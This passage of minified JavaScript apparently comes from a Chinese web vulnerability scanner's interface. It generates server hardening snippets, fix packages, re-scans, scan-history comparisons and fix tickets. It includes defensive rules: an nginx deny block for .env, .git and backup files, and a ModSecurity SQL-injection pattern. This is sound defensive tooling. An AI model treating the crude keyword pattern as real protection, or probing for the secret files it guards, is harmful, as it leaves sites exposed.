i=document.getElementById("finding-list-"+e);i&&i.classList.add("active"),document.querySelectorAll(".finding-detail").forEach(function(r){r.classList.remove("active")});let t=document.getElementById("finding-detail-"+e);t&&t.classList.add("active")}function ua(){ue("gen-fix-btn",!0);try{if(!de){ue("gen-fix-btn",!1);return}let e=document.getElementById("gen-fix-input"),i=document.getElementById("gen-fix-output");if(!e||!i){ue("gen-fix-btn",!1);return}let t=e.value.trim();if(!t){i.innerHTML='<div style="color:var(--warning);font-size:13px;margin-top:8px">请输入服务器配置内容</div>',ue("gen-fix-btn",!1);return}let r=fa(de.findings,t);i.innerHTML='<div style="margin-top:14px"><div class="finding-section"><h4>复测后配置</h4><div class="code-block">'+w(r.fixed)+`</div></div><div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, '`+btoa(encodeURIComponent(r.fixed))+`')"> 复制配置</button></div></div>`}catch(e){console.error("generateFixFromResult error:",e);let i=document.getElementById("gen-fix-output");i&&(i.innerHTML='<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：'+w(e.message||String(e))+"</div>")}finally{ue("gen-fix-btn",!1)}}function fa(e,i){try{Array.isArray(e)||(e=[]),typeof i!="string"&&(i="");let t=i,r=/server\s*\{/.test(t);r||(t=`server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;

`);let s=[],a=[];if(e.forEach(function(o){let n=o.name||"",d=o.type||"config",u=String(d||"").toLowerCase(),h=o.fix||"";n.indexOf("缺少 ")===0&&(n.indexOf("HSTS")>=0||n.indexOf("CSP")>=0||n.indexOf("X-Frame")>=0||n.indexOf("X-Content")>=0||n.indexOf("Referrer")>=0||n.indexOf("Permissions")>=0)?h&&s.push(h):n.indexOf("敏感路径")>=0||n.indexOf("敏感文件")>=0?a.push(`location ~ /(.env|.git|.*.sql|.*.zip|.*.bak) {
    deny all;
    return 403;
}`):n.indexOf("信息泄露")>=0||n.indexOf("Server")>=0?s.push("server_tokens off;"):n.indexOf("Cookie")>=0?s.push("proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;"):n.indexOf("CORS")>=0?s.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;"):(u==="xss"||n.toLowerCase().indexOf("xss")>=0)&&h?s.push(`add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;`):(u==="csrf"||n.toLowerCase().indexOf("csrf")>=0||n.toLowerCase().indexOf("xsrf")>=0)&&h?a.push("# CSRF: enforce token validation, SameSite cookies, and Origin/Referer checks."):(u==="traversal"||n.toLowerCase().indexOf("path traversal")>=0||n.indexOf("目录穿越")>=0)&&h?a.push("# Traversal: normalize paths and restrict access to an allowed base directory."):(u==="ssrf"||n.toLowerCase().indexOf("ssrf")>=0)&&h?a.push("# SSRF: validate targets, block private IP ranges, and resolve DNS before fetching."):(u==="auth_weakness"||n.indexOf("认证")>=0||n.indexOf("登录")>=0)&&h?a.push("# Authentication: add CSRF tokens, secure cookies, X-Frame-Options, and centralized auth middleware."):(u==="bruteforce_protection"||n.indexOf("防爆破")>=0||n.indexOf("限流")>=0)&&h?a.push("# Brute force protection: add login throttling, account lockout, CAPTCHA/2FA, and audit logging."):(u==="unauthorized_access"||n.indexOf("未授权")>=0||n.indexOf("越权")>=0)&&h?a.push("# Unauthorized access: protect sensitive routes with authentication and object-level authorization."):(u==="api_auth_missing"||n.indexOf("API 鉴权")>=0)&&h?a.push("# API authorization: require authentication and object-level authorization for every sensitive endpoint."):(u==="sensitive_config_exposure"||n.indexOf("敏感配置")>=0)&&h?a.push("# Sensitive config: deny access to .env/.git/backups and remove secrets from public artifacts."):(u==="clickjacking"||n.indexOf("点击劫持")>=0||n.indexOf("X-Frame-Options")>=0)&&h?a.push("# Clickjacking: set X-Frame-Options or frame-ancestors to block unauthorized embedding."):(u==="file_upload"||n.indexOf("文件上传")>=0||n.indexOf("上传")>=0)&&h?a.push("# File upload: restrict extensions, verify MIME type, scan content, and store uploads outside web root."):(u==="logic_bypass"||n.indexOf("逻辑绕过")>=0||n.indexOf("业务绕过")>=0)&&h?a.push("# Logic bypass: enforce server-side state checks, step order, and authorization at every transition."):(u==="cmdi"||n.toLowerCase().indexOf("command injection")>=0||n.indexOf("命令注入")>=0)&&h?a.push("# Command injection: avoid shell=True, use argument arrays, and whitelist every executable argument."):(u==="xxe"||n.toLowerCase().indexOf("xxe")>=0||n.indexOf("xml external entity")>=0)&&h?a.push("# XXE: disable DTD and external entities, and use safe XML parser settings."):(u==="idor"||n.toLowerCase().indexOf("idor")>=0||n.indexOf("对象级")>=0)&&h?a.push("# IDOR: enforce object-level authorization on every record lookup."):(u==="deserialization"||n.toLowerCase().indexOf("deserialization")>=0||n.indexOf("反序列化")>=0)&&h?a.push("# Deserialization: forbid untrusted object graphs, add allowlists, and sign payloads before loading."):(u==="ssti"||n.indexOf("模板注入")>=0)&&h?a.push("# Template engine: enable auto-escaping and never concatenate user input into expressions."):(u==="open_redirect"||n.indexOf("开放重定向")>=0)&&h?a.push("# Redirects: validate targets against a whitelist and allow only trusted relative paths."):u==="sqli"&&h&&a.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"')}),s.length>0||a.length>0)if(r){let o=t.lastIndexOf("}"),n=t.substring(0,o),d=t.substring(o);s.length>0&&(n+=`
    # === 安全响应头（由漏洞哨兵生成） ===
`,s.forEach(function(u){u.split(`
`).forEach(function(c){c.trim()&&(n+="    "+c.trim()+`
`)})})),a.length>0&&(n+=`
    # === 拦截规则（由漏洞哨兵生成） ===
`,a.forEach(function(u){n+="    "+u+`
`})),t=n+d}else s.forEach(function(o){t+=o+`
`}),a.forEach(function(o){t+=o+`
`}),t+=`}
`;return{fixed:t}}catch(t){return console.error("generateFixFromFindings error:",t),{fixed:i||"",error:t.message||String(t)}}}function ga(){if(!de){T("请先完成扫描");return}ue("goto-fixer-btn",!0),ze("fixer"),T("正在生成修复方案...");let e=de.url;ce("/api/fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(i){return i.json()}).then(function(i){if(ue("goto-fixer-btn",!1),i.success)We=i.fixes,ui(i.fixes,i.score);else{let t=document.getElementById("fixer-result");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">生成失败: '+w(qe(i))+"</p></div>")}}).catch(function(i){ue("goto-fixer-btn",!1);let t=Mn(de.findings);We=t,ui(t,de.score)})}function Mn(e){try{Array.isArray(e)||(e=[]);let i={nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]};return e.forEach(function(t){let r=t.fix||"";r&&(i.nginx.push(r),i.apache.push(r.replace("add_header","Header set").replace("always;","")),i.express.push("// "+t.name+": "+r.substring(0,60)),i.flask.push("# "+t.name+": "+r.substring(0,60)),i.spring_boot.push("// "+t.name+": "+r.substring(0,60)),i.cloudflare.push("# "+t.name+": "+r.substring(0,60)),i.python.push("# "+t.name+": "+r.substring(0,60)),i.nodejs.push("// "+t.name+": "+r.substring(0,60)))}),i}catch(i){return console.error("generateLocalFixes error:",i),{nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]}}}function ui(e,i){try{(!e||typeof e!="object")&&(e={nginx:[],python:[],nodejs:[],apache:[]});let t=document.getElementById("fixer-scan-prompt"),r=document.getElementById("fixer-lang-tabs"),s=document.getElementById("fixer-result");if(t&&(t.style.display="none"),r&&(r.style.display="block"),!s)return;let a="",o={nginx:"Nginx",python:"Python (Flask)",nodejs:"Node.js (Express)",apache:"Apache"},n={nginx:"",python:"",nodejs:"",apache:""},d=bn,u=e[d]||[];if(a+='<div class="card fade-in-up">',a+='<div class="card-title">'+n[d]+" "+o[d]+" 修复代码</div>",a+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 '+u.length+" 条建议，评分: "+(typeof i=="number"&&!isNaN(i)?i:0)+"</div>",u.length===0)a+='<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';else{let h=u.map(function(c){return typeof c=="string"?c:c&&typeof c=="object"?c.code||"":String(c)}).join(`

`);a+='<div class="code-block" style="max-height:400px;overflow-y:auto">'+w(h)+"</div>",a+='<div class="fixer-btns" style="margin-top:12px">',a+=`<button class="fixer-btn success" onclick="copyFixCodeByLang('`+d+`')"> 复制代码</button>`,a+=`<button class="fixer-btn primary" onclick="downloadFixCode('`+d+`')"> 下载文件</button>`,a+="</div>"}a+='<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">',a+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>',["nginx","python","nodejs","apache"].forEach(function(h){if(h===d)return;let c=(e[h]||[]).length;a+='<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">',a+="<span>"+n[h]+" "+o[h]+"</span>",a+='<span style="color:var(--text-lighter)">'+c+" 条修复</span>",a+="</div>"}),a+="</div>",a+="</div>",s.innerHTML=a}catch(t){console.error("renderFixResult error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复结果失败: '+w(t.message||String(t))+"</p></div>")}}function va(e){bn=e,document.querySelectorAll(".lang-tab").forEach(function(i){i.dataset.lang===e?i.className="fixer-btn primary lang-tab active":i.className="fixer-btn secondary lang-tab"}),We&&ui(We,de?de.score:0)}function ha(e,i){i=i||"fix-",["nginx","apache","express","flask","spring_boot","cloudflare"].forEach(function(r){let s=document.getElementById(i+"tab-"+r),a=document.getElementById(i+"content-"+r);s&&a&&(r===e?(s.style.background="var(--primary)",s.style.color="#fff",s.style.borderColor="var(--primary)",a.style.display="block"):(s.style.background="transparent",s.style.color="var(--text-secondary)",s.style.borderColor="var(--border)",a.style.display="none"))})}function Si(e){return Array.isArray(e)?e.map(function(i){return typeof i=="string"?i:i&&typeof i=="object"?i.code||"":String(i)}).join(`

`):""}function ma(e){if(!We)return;let i=Si(We[e]||[]);kt(i),T("已复制 "+e+" 修复代码")}function ya(e){if(!We)return;let i=Si(We[e]||[]),r="security-fix."+({nginx:"conf",python:"py",nodejs:"js",apache:"conf"}[e]||"txt"),s=new Blob([i],{type:"text/plain"}),a=URL.createObjectURL(s),o=document.createElement("a");o.href=a,o.download=r,document.body.appendChild(o),o.click(),document.body.removeChild(o),URL.revokeObjectURL(a),T("已下载 "+r)}async function ba(){if(!de){T("请先完成扫描");return}let e=We||Mn(de.findings),i=["nginx","apache","express","flask","spring_boot","cloudflare","python","nodejs"],t=new cs,r={product:"Vuln Sentinel",package_type:"repair_configuration_package",target:de.url||"",generated_at:new Date().toISOString(),generated_at_local:new Date().toLocaleString("zh-CN"),scan_id:de.scan_id||null,score:typeof de.score=="number"?de.score:null,findings:Array.isArray(de.findings)?de.findings.length:0,version:"Vuln Sentinel"};t.file("manifest.json",JSON.stringify(r,null,2)),t.file("README.txt",["Vuln Sentinel 修复配置包","目标: "+(de.url||""),"生成时间: "+new Date().toLocaleString("zh-CN"),"","内容结构:","- manifest.json: 包信息与扫描摘要","- README.txt: 使用说明","- 各平台 .txt: 对应平台的修复片段","","说明:","- 如果某个平台文件为空，表示当前扫描结果暂未生成对应配置","- 请优先查看报告中的漏洞证据和修复说明"].join(`
`));let s=!1;i.forEach(function(d){let u=e&&e[d]?e[d]:[],h=u.length===0?`暂无适用配置片段
`:Si(u)+`
`;u.length>0&&(s=!0),t.file(d+".txt",h)}),s||t.file("USAGE.txt",`当前扫描结果没有直接生成平台配置片段。请先查看报告中的漏洞证据与建议，再重新生成修复包。
`);let a=await t.generateAsync({type:"blob"}),o=URL.createObjectURL(a),n=document.createElement("a");n.href=o,n.download="vuln-sentinel-fixes-"+nt(de.url)+".zip",document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(o),T("修复配置包已下载")}function xa(){if(!de){T("请先完成扫描");return}let e=de.url;if(!e){T("无法获取扫描 URL");return}let i=document.getElementById("verify-fix-btn");i&&(i.disabled=!0,i.textContent="验证中..."),T("正在重新扫描验证修复效果..."),ce("/api/verify-fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(t){if(t.status===402)return t.json().then(function(r){return r._status=402,r});if(!t.ok)throw new Error("接口返回 "+t.status);return t.json()}).then(function(t){if(i&&(i.disabled=!1,i.textContent="验证修复效果"),Kt(t)){T($t(t),"error"),He();return}if(t.success){let r=de.score,s=t.new_score,a="重新扫描完成！评分: "+r+" → "+s;s>r?a+=" (提升 "+(s-r)+" 分)":s<r?a+=" (下降 "+(r-s)+" 分)":a+=" (无变化)",T(a);let o=(de.findings||[]).map(function(h){return h.name}),n=(t.new_findings||[]).map(function(h){return h.name}),d=o.filter(function(h){return n.indexOf(h)===-1}).length;d>0&&T("已修复 "+d+" 个安全问题");let u=Object.assign({},de,{score:t.new_score,risk_level:t.new_risk_level,findings:t.new_findings});de=u,St(u),ze("result"),He()}else T("验证失败: "+qe(t),"error")}).catch(function(t){i&&(i.disabled=!1,i.textContent="验证修复效果"),T("验证扫描出错: "+t.message,"error")})}function Pn(e){Ei()}function wa(){confirm("确定要清空所有扫描历史吗？此操作不可恢复。")&&ce("/api/history",{method:"DELETE"}).then(function(e){return e.json()}).then(function(e){T("已清空 "+(e.deleted||0)+" 条扫描历史"),Ei(),Et()}).catch(function(){T("清空失败，请检查网络","error")})}function ka(){ct=!ct,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display=ct?"flex":"none"),Fn(),Et(Yt)}function _a(){ct=!1,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display="none"),Et(Yt)}function Sa(e){let i=Be.indexOf(e);if(i>=0)Be.splice(i,1);else{if(Be.length>=2){T("最多选择 2 条记录进行对比");return}Be.push(e)}Fn(),Et(Yt)}function Fn(){let e=document.getElementById("history-compare-count"),i=document.getElementById("history-compare-btn");e&&(e.textContent=String(Be.length)),i&&(i.disabled=Be.length!==2)}function Ea(){if(Be.length!==2){T("请选择 2 条记录");return}ce("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=i[Be[0]],r=i[Be[1]];if(!t||!r){T("记录不存在");return}let s=za(t,r),a='<div class="card" style="margin-bottom:16px">';a+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">',a+='<div class="card-title"> 历史对比</div>',a+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>',a+="</div>",a+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">',a+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',a+='<div style="font-size:12px;color:var(--text-secondary)">'+w(t.created_at||t.time||"")+"</div>",a+='<div style="font-size:24px;font-weight:800;color:'+Ut(t.score)+'">'+(t.score||0)+"</div>",a+="</div>",a+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',a+='<div style="font-size:12px;color:var(--text-secondary)">'+w(r.created_at||r.time||"")+"</div>",a+='<div style="font-size:24px;font-weight:800;color:'+Ut(r.score)+'">'+(r.score||0)+"</div>",a+="</div>",a+="</div>",a+='<div style="font-size:13px;margin-bottom:8px">分数变化：'+(s.scoreDelta>0?"+":"")+s.scoreDelta+" "+(s.scoreDelta>0||s.scoreDelta<0?"":"->")+"</div>",s.newIssues.length&&(a+='<div style="font-size:12px;color:var(--danger);margin-bottom:6px">新增问题（'+s.newIssues.length+"）</div>",s.newIssues.forEach(function(n){a+='<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">'+w(n.name||n)+"</div>"})),s.fixedIssues.length&&(a+='<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（'+s.fixedIssues.length+"）</div>",s.fixedIssues.forEach(function(n){a+='<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">'+w(n.name||n)+"</div>"})),!s.newIssues.length&&!s.fixedIssues.length&&(a+='<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>'),a+="</div>";let o=it("scan-history-list");o&&(o.innerHTML=a),$e("history-pagination","none")}).catch(function(){T("加载失败")})}function za(e,i){let t=(e.findings||[]).map(function(o){return o.name||o}),r=(i.findings||[]).map(function(o){return o.name||o}),s=[],a=[];return r.forEach(function(o){t.indexOf(o)===-1&&s.push({name:o})}),t.forEach(function(o){r.indexOf(o)===-1&&a.push({name:o})}),{scoreDelta:(i.score||0)-(e.score||0),newIssues:s,fixedIssues:a}}function jn(e){let i=document.getElementById("history-trend-wrap"),t=document.getElementById("history-trend-chart");if(!i||!t)return;let r=e.slice(0,5).reverse();if(r.length<2){i.style.display="none";return}i.style.display="block";let s=t.clientWidth||300,a=60,o=4,n=100,d=r.map(function(c,p){let v=o+p/(r.length-1)*(s-o*2),m=a-o-(c.score||0)/n*(a-o*2);return{x:Math.round(v),y:Math.round(m),score:c.score||0}}),u='<svg width="'+s+'" height="'+a+'" style="overflow:visible">';u+='<line x1="'+o+'" y1="'+a/2+'" x2="'+(s-o)+'" y2="'+a/2+'" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';let h=d.map(function(c,p){return(p===0?"M":"L")+c.x+","+c.y}).join(" ");u+='<path d="'+h+'" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>',d.forEach(function(c){let p=c.score>=75?"#73c990":c.score>=50?"#f0a732":"#c75450";u+='<circle cx="'+c.x+'" cy="'+c.y+'" r="3" fill="'+p+'"/>'}),u+="</svg>",t.innerHTML=u}function Et(e){e=e||1,Yt=e;let i=it("scan-history-list");if(i){if(!he()){i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>',$e("history-pagination","none");return}i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">正在读取扫描历史...</p>',ce("/api/history?limit=50").then(function(t){return t.json()}).then(function(t){let r=t.history||[];if(r.length===0){i.innerHTML=`<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始体检」试试</div><div style="margin-top:12px"><button class="fixer-btn primary" onclick="navigateTo('scan')">开始体检</button></div></div>`,$e("history-pagination","none");let d=document.getElementById("history-trend-wrap");d&&(d.style.display="none");return}jn(r);let s=Math.ceil(r.length/ni),a=(e-1)*ni,o=r.slice(a,a+ni),n="";ct||(n+='<div style="text-align:right;margin-bottom:8px">',n+='<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>',n+="</div>"),o.forEach(function(d,u){let h=a+u,c=d.score>=75?"var(--success)":d.score>=50?"var(--warning)":"var(--danger)",p=(r[h+1]||{}).score,v="";if(typeof p=="number"&&(v=(d.score||0)>p?' <span style="color:var(--success);font-size:12px"></span>':(d.score||0)<p?' <span style="color:var(--danger);font-size:12px"></span>':' <span style="color:var(--text-lighter);font-size:12px">-></span>'),ct){let m=Be.indexOf(h)>=0?"checked":"";n+='<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">',n+='<input type="checkbox" '+m+' onchange="onHistorySelect('+h+')" style="width:16px;height:16px;accent-color:var(--primary)">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+w(d.url||d.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+w(d.created_at||d.time||"")+" &middot; 发现 "+(d.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+c+'">'+(d.score||0)+v+"</div>",n+="</label>"}else n+='<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory('+h+')" role="button" tabindex="0" aria-label="恢复 '+w(d.url||d.host||"")+' 的扫描结果">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+w(d.url||d.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+w(d.created_at||d.time||"")+" &middot; 发现 "+(d.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+c+'">'+(d.score||0)+v+"</div>",n+="</div>"}),i.innerHTML=n,hi("history-pagination",e,s,"renderScanHistory")}).catch(function(){i.innerHTML='<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>'})}}function Ia(e){ce("/api/history?limit=50").then(function(i){return i.json()}).then(function(i){let t=i.history||[];if(!t[e])return;let r=t[e];ze("scan");let s=document.getElementById("scan-url");s&&(s.value=r.url||""),T('已填入历史网址，点击"下一步"重新扫描')}).catch(function(){T("加载历史记录失败")})}function Ei(){if(!he()){lt("stat-scan-count","0"),lt("stat-avg-score","-"),lt("stat-fixed-count","0");return}ce("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=e.stats||{scan_count:i.length,fixed_count:0},r=document.getElementById("stat-scan-count"),s=document.getElementById("stat-avg-score"),a=document.getElementById("stat-fixed-count");if(r&&(r.textContent=t.scan_count||i.length),s)if(i.length===0)s.textContent="-";else{let o=i.reduce(function(n,d){return n+(d.score||0)},0);s.textContent=Math.round(o/i.length)}a&&(a.textContent=t.fixed_count||0)}).catch(function(){})}window.startScanDirect=ki;window.startScan=_i;window.updateScanStartState=pt;window.dismissHomeOnboarding=Bs;window.downloadAuditReport=Fs;window.runAuditWorkbench=Ps;window.fillAuditTargetFromScan=Ms;window.goVerifyStep2=Ks;window.cancelScan=na;window.quickDemo=Gs;window.showFullScanDetail=Js;window.downloadReport=Cs;window.toggleReportDropdown=As;window.showBatchScanModal=Ws;window.closeBatchScanModal=Zs;window.doBatchScan=Xs;window.copyToken=ta;window.selectVerifyMethod=Ys;window.confirmVerification=ea;window.skipVerification=Qs;window.loadPublicDemo=js;window.goToFixerWithScanResult=ga;window.switchFixLang=va;window.clearScanHistory=wa;window.cancelHistoryCompare=_a;window.doHistoryCompare=Ea;window.addMonitorTarget=zs;window.scanRedirectTarget=la;window.copyFixCode=Vs;window.renderResult=St;window.selectFinding=Rn;window.toggleFinding=pa;window.shareResult=da;window.showPdfDownloadTip=ca;window.restoreScanFromHistory=Ia;window.updateProfileStats=Ei;window.renderScanHistory=Et;window.renderMonitorTargets=wi;window.renderHistoryTrendChart=jn;window.toggleHistoryCompareMode=ka;window.onHistorySelect=Sa;window.removeMonitorTarget=Is;window.generateFixFromResult=ua;window.verifyFix=xa;window.downloadAllFixes=ba;window.downloadFixCode=ya;window.copyFixCodeByLang=ma;window.switchFixPlatform=ha;window.switchPublicFixTab=Ns;window.doPublicDemoFix=Ds;window.renderFixComparison=Cn;window.showAutoFixDialog=Us;window.closeAutoFixDialog=$s;window.executeAutoFix=qs;window.retryScan=oa;window.retryScanWithUrl=sa;window.backToScanInput=aa;window.calculateScore=ia;window.loadDashboard=Rs;window.loadTrend=zn;window.drawTrendChart=In;window.renderRadarChart=xn;window.buildRadarSvg=On;window.animateScoreProgress=wn;window.simulateCSRF=_s;window.simulateXSS=Ss;window.simulateClickjacking=Es;window.updateStage=Vt;window.animateStages=An;window.finishStages=Ue;window.startProgressAnimation=Ln;window.stopProgressAnimation=pi;window.setScanProgress=Bn;window.updateScanCreditsHint=Sn;window.loadTrendChart=function(e){e=e||30;let i=document.getElementById("trend-chart");if(!i)return;document.querySelectorAll(".trend-range").forEach(function(r){let s=parseInt(r.getAttribute("data-days"),10)===e;r.style.background=s?"#4b6eaf":"#45494a",r.style.color=s?"#fff":"#808080",r.style.borderColor=s?"#4b6eaf":"#555555"});let t=new Date;t.setDate(t.getDate()-e),t.setHours(0,0,0,0),ke("/api/trend?limit="+e).then(function(r){if(!r||!r.success){i.innerHTML="<span>暂无趋势数据</span>";return}let s=r.data&&r.data.series?r.data.series:{},a=Object.keys(s);if(a.length===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let o={},n=0;if(a.forEach(function(h){(s[h]||[]).forEach(function(c){let p=c.time?c.time.replace(" ","T"):"",v=new Date(p);if(!v||isNaN(v.getTime())||v<t)return;n++;let m=p.split("T")[0];o[m]||(o[m]={sum:0,count:0}),o[m].sum+=typeof c.score=="number"?c.score:parseInt(c.score,10)||0,o[m].count++})}),n===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let d=Object.keys(o).sort(),u=d.map(function(h){return Math.round(o[h].sum/o[h].count)});i.innerHTML=Ca(u,d)}).catch(function(r){i.innerHTML="<span>加载趋势失败，请稍后重试</span>"})};function Ca(e,i,t){if(!e||e.length===0)return"<span>暂无数据</span>";let r=640,s=120,a={top:10,right:10,bottom:24,left:30},o=r-a.left-a.right,n=s-a.top-a.bottom,d=Math.max(0,Math.min.apply(null,e)-5),h=Math.min(100,Math.max.apply(null,e)+5)-d||1;function c(O){return a.left+O/(e.length-1||1)*o}function p(O){return a.top+n-(O-d)/h*n}let v="M"+e.map(function(O,j){return c(j).toFixed(1)+" "+p(O).toFixed(1)}).join(" L"),m=v+" L"+c(e.length-1).toFixed(1)+" "+(s-a.bottom).toFixed(1)+" L"+c(0).toFixed(1)+" "+(s-a.bottom).toFixed(1)+" Z",g=e.map(function(O,j){return'<circle cx="'+c(j).toFixed(1)+'" cy="'+p(O).toFixed(1)+'" r="2.5" fill="#4b6eaf"/>'}).join(""),y=i[0]?i[0].slice(5):"",b=i[i.length-1]?i[i.length-1].slice(5):"",_=e[e.length-1],x=c(e.length-1),I=p(_),z='<rect x="'+(x-16)+'" y="'+(I-18)+'" width="32" height="14" rx="2" fill="#4b6eaf"/>',M='<text x="'+x+'" y="'+(I-8)+'" text-anchor="middle" font-size="9" fill="#fff">'+_+"</text>";return'<svg viewBox="0 0 '+r+" "+s+'" style="width:100%;height:100%"><defs><linearGradient id="trendGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#4b6eaf" stop-opacity="0.35"/><stop offset="100%" stop-color="#4b6eaf" stop-opacity="0.05"/></linearGradient></defs><rect x="'+a.left+'" y="'+a.top+'" width="'+o+'" height="'+n+'" fill="rgba(0,0,0,0.1)" rx="2"/><path d="'+m+'" fill="url(#trendGrad)"/><path d="'+v+'" fill="none" stroke="#4b6eaf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'+g+z+M+'<text x="'+a.left+'" y="'+(s-6)+'" font-size="10" fill="#808080">'+w(y)+'</text><text x="'+(r-a.right)+'" y="'+(s-6)+'" text-anchor="end" font-size="10" fill="#808080">'+w(b)+"</text></svg>"}window.addEventListener("load",function(){bt();let e=document.getElementById("scan-url");e&&e.addEventListener("input",bt);let i=document.getElementById("auth-check-step1");i&&i.addEventListener("change",bt);let t=document.getElementById("auth-check");t&&t.addEventListener("change",bt)});function Ta(e){let i=Object.assign({},e);const t=new Set;return{getState(){return i},setState(r){i=Object.assign({},i,r),t.forEach(function(s){try{s(i)}catch(a){console.error("store subscriber error:",a)}})},subscribe(r){return t.add(r),function(){t.delete(r)}}}}const me=Ta({tickets:[],ticketFilter:"pending",ticketCollaborators:[],user:null});async function Aa(){const e=await Promise.all([zr(),Cr().catch(function(){return{members:[]}})]),i=e[0],t=e[1],r=i&&i.data?i.data:i,s=t&&t.data?t.data:t,a=r&&r.tickets?r.tickets:[],o=s&&s.members?s.members:[];return me.setState({tickets:a,ticketCollaborators:o}),i}function La(e){me.setState({ticketFilter:e})}function Ba(){const e=me.getState();return e.tickets.filter(function(i){return i.status===e.ticketFilter})}function rt(e){return me.getState().tickets.find(function(t){return t.id===e})||null}async function Oa(e,i){const t=await _t(e,{status:i}),s=me.getState().tickets.map(function(a){return a.id===e?Object.assign({},a,{status:i}):a});return me.setState({tickets:s}),t}async function Ra(e,i){const t=await _t(e,{notes:i}),s=me.getState().tickets.map(function(a){return a.id===e?Object.assign({},a,{notes:i}):a});return me.setState({tickets:s}),t}async function Ma(e,i){const t=await _t(e,{owner:i}),s=me.getState().tickets.map(function(a){return a.id===e?Object.assign({},a,{owner:i}):a});return me.setState({tickets:s}),t}async function Pa(e,i){const t=await _t(e,i),s=me.getState().tickets.map(function(a){return a.id===e?Object.assign({},a,i):a});return me.setState({tickets:s}),t}async function Fa(e){const i=await sn(e),r=me.getState().tickets.filter(function(s){return s.id!==e});return me.setState({tickets:r}),i}async function ja(e,i){const t=[];for(let a=0;a<e.length;a++)t.push(await _t(e[a],{status:i}));const s=me.getState().tickets.map(function(a){return e.indexOf(a.id)!==-1?Object.assign({},a,{status:i}):a});return me.setState({tickets:s}),t}async function Ha(e){const i=[];for(let s=0;s<e.length;s++)i.push(await sn(e[s]));const r=me.getState().tickets.filter(function(s){return e.indexOf(s.id)===-1});return me.setState({tickets:r}),i}async function Na(e){const i=await Re("/api/fix-tickets/"+e+"/verify",{rescan:!0});return me.setState({lastVerifiedAt:Date.now()}),i}async function Da(e,i){return Ir(e,i)}const Ve={severityClass:function(e){return e==="high"||e==="critical"?"high":e==="medium"?"medium":"low"},severityLabel:function(e){return{critical:"严重",high:"高危",medium:"中危",low:"低危"}[e]||e},statusLabel:function(e){return{pending:"待修复",confirmed:"已确认",applying:"应用中",in_progress:"修复中",fixed:"已修复",failed:"修复失败",rolled_back:"已回滚",ignored:"已忽略"}[e]||e}};let Wi=!1;function zi(e,i){const t=String((e==null?void 0:e.status)||"").toLowerCase(),r=String((e==null?void 0:e.severity)||"").toLowerCase(),s=Array.isArray(i)?i:[],a=s.filter(h=>h.status==="done").length,o=s.find(h=>h.status==="failed"),n=[...s].reverse().find(h=>h.status==="done"&&h.time);let d="工单已进入整改流程，建议继续推进修复与复测。",u="先确认修复方案，再安排应用和复测。";return 